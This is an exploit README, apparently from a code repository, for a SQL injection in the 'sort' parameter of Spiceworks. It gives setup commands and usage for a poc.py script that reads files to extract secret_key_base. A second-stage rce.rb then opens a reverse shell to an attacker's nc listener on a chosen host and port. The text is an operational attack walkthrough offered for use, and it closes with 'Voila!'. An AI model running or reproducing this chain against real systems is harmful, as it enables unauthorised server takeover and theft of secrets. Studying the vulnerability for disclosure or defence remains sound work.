# Spiceworks Sort SQLi

There's a SQLi in a `sort` parameter of Spiceworks. The full exploit chain is SQLi -> file read -> RCE.

## Demo
[![asciicast](https://asciinema.org/a/yOhUguVcK0brlITWq8t9DLL7J.svg)](https://asciinema.org/a/yOhUguVcK0brlITWq8t9DLL7J?t=5:30)

## Prerequisites
```bash
apt update && apt install -y ruby-dev nodejs python3 python3-pip libsqlite3-dev
pip3 install requests
gem install bundler && cd rce && bundle install
```

## Stage 1
Use `poc.py` to exploit the SQLi -> file read and extract the secret_key_base environment variable. It will then generate a PoC ruby script to gain a reverse shell, with the values obtained from `poc.py`. 

### Usage
```
usage: poc.py [-h] --rhost RHOST --lhost LHOST --lport LPORT -u USER -p PASSWORD [-e ENV_PATH]

There's a SQLi in a `sort` parameter of Spiceworks. The exploit chain is SQLi -> file read -> RCE.

optional arguments:
  -h, --help            show this help message and exit
  --rhost RHOST         https://example.com
  --lhost LHOST         10.10.10.10
  --lport LPORT         9001
  -u USER, --user USER  test@test.com
  -p PASSWORD, --password PASSWORD
                        P@$$w0rd!
  -e ENV_PATH, --env_path ENV_PATH
                        Path to environment variables
```

## Stage 2
Use `rce.rb`. Spin up a nc listener on the IP & port you provided in Stage 1, then simply:

```bash
cd rce && ruby rce.rb
```

Voila!

# Credits
- [@aidanstansfield](https://github.com/aidanstansfield)
